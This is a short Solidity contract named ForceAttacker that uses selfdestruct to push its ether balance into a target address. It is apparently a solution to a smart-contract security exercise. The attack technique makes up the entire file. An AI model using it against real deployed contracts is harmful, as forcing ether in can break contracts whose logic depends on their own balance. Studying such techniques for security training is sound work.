// SPDX-License-Identifier: MIT
pragma solidity ^0.8.0;

contract ForceAttacker {
  function destroy(address payable target) public payable {
    selfdestruct(target);
  }
}